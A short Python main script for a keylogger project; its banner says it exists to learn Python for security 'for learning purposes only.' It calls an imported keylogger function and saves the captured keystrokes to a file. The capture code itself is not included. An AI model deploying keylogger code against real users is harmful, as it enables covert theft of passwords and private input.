from loggermain import keylogger
import os 
import textwrap

from savefile import savefile

if __name__ == '__main__':
    print(textwrap.dedent("""
    jhyungleeCS | mangoclient keylogger
    A project to learn about Python and how it can be applied
    in the security field. FOR LEARNING PURPOSES ONLY! 
    Logging KeyStrokes ~: 
    """))

    keylog = keylogger()
    savefile(keylog)

